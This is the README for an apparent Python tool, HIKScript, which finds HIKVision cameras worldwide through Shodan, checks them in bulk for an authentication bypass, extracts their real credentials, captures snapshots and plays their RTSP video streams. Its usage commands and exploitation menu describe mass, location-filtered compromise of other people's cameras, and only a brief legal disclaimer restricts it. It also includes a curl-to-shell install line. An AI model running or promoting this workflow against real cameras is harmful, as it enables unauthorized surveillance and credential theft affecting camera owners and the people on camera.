# HIKScript - HIKVision Camera Scanner & Exploitation Tool

> Modern Python tool for HIKVision camera discovery and security testing

## 🚀 Features

- **Shodan Integration**: Find HIKVision cameras worldwide
- **Vulnerability Scanning**: Check cameras for authentication bypass
- **Auto RTSP Discovery**: Extract credentials and test RTSP streams automatically
- **Snapshot Capture**: Save images from vulnerable cameras
- **Interactive Exploitation**: User-friendly menu for camera analysis
- **Geolocation**: Optional IP location services

## 📋 Requirements

- Python 3.13+
- OpenSSL (for credential decryption)
- FFmpeg (optional, for RTSP testing and playback)

## 🛠️ Installation

### Using mise (recommended)

```bash
# Install mise if you don't have it
curl https://mise.run | sh

# Install Python and dependencies
mise install
pip install -r requirements.txt
```

### Manual installation

```bash
# Ensure Python 3.13+ is installed
pip install -r requirements.txt
```

### System dependencies

```bash
# Ubuntu/Debian
sudo apt install openssl ffmpeg

# macOS
brew install openssl ffmpeg
```

## 🎯 Usage

### 1. Scan for cameras

```bash
# Find HIKVision cameras using Shodan
python HIKScript.py scan --api-key YOUR_SHODAN_API_KEY

# Filter by location
python HIKScript.py scan --api-key YOUR_SHODAN_API_KEY --city "Madrid" --country "ES"
```

### 2. Check vulnerabilities

```bash
# Test cameras from scan results
python HIKScript.py check --input targets/hikvision_*.txt

# Custom timeout and snapshot saving
python HIKScript.py check --input targets.txt --timeout 10 --save-snapshot --threads 20
```

### 3. Exploit specific camera

```bash
# Interactive exploitation menu
python HIKScript.py exploit 192.168.1.100:80

# With geolocation services
python HIKScript.py exploit 192.168.1.100:80 --ipinfo-token YOUR_TOKEN
```

## 🎮 Exploitation Menu

```
📋 Exploitation Options:
1. Extract credentials       # Get real passwords from camera
2. Capture snapshots        # Save images at intervals
3. Test RTSP streams        # Manual RTSP testing
4. Check RTSP port          # Verify RTSP connectivity
5. Auto RTSP discover       # 🆕 Smart credential extraction + RTSP testing
6. Show camera info         # Device details and geolocation
7. Refresh camera info      # Update information
8. Open Shodan page         # View in browser
```

### 🌟 Auto RTSP Discover

The **Auto RTSP discover** feature:

1. **Extracts real credentials** from the camera
2. **Tests RTSP streams** sequentially (101→102→201→202→301→302→401→402)
3. **Stops on first failure** for efficiency
4. **Plays working streams** with ffplay (if available)

```
🔍 Auto RTSP Discovery for 192.168.1.100:80
📊 Step 1: Extracting credentials...
✅ Found credentials for users: admin, operator

📡 Step 2: Testing RTSP streams...
🔑 Testing: admin:mypassword123
   Channel 101... ✅
   Channel 102... ✅
   Channel 201... ❌
   🛑 Stopping search (remaining channels likely unavailable)

🎉 Found 2 working RTSP streams!
🎬 ffplay is available! Select stream to play:
```

## 📁 Output Structure

```
hikscript/
├── targets/           # Shodan scan results
├── vulnerable/        # Vulnerable cameras
├── snapshots/         # Captured images (organized by IP)
└── hikscript.log     # Application logs
```

## 🔧 Command Options

### Scan mode

- `--api-key`: Shodan API key (required)
- `--city`: Filter by city
- `--country`: Filter by country code
- `--limit`: Max results (0 = free tier limit)
- `--output`: Custom output file

### Check mode

- `--input`: Input file with IPs (required)
- `--output`: Output file for vulnerable IPs
- `--threads`: Concurrent workers (default: 50)
- `--timeout`: HTTP timeout in seconds (default: 5)
- `--save-snapshot`: Save images from vulnerable cameras

### Exploit mode

- `target`: IP:PORT to exploit (required)
- `--ipinfo-token`: IPInfo API token for geolocation

## 🔑 API Keys

- **Shodan**: Get free API key at [shodan.io](https://shodan.io) (100 results/month)
- **IPInfo**: Optional, get token at [ipinfo.io](https://ipinfo.io) (50k requests/month free)

## ⚠️ Legal Notice

This tool is for **authorized security testing only**. Ensure you have permission to test target systems. Users are responsible for compliance with applicable laws.

## 🐛 Troubleshooting

**OpenSSL not found:**

```bash
sudo apt install openssl  # Ubuntu/Debian
brew install openssl       # macOS
```

**RTSP testing fails:**

```bash
sudo apt install ffmpeg   # Ubuntu/Debian
brew install ffmpeg        # macOS
```

**No streams found in Auto RTSP:**

- Verify credentials are correct
- Check if RTSP port 554 is open
- Try manual RTSP testing first
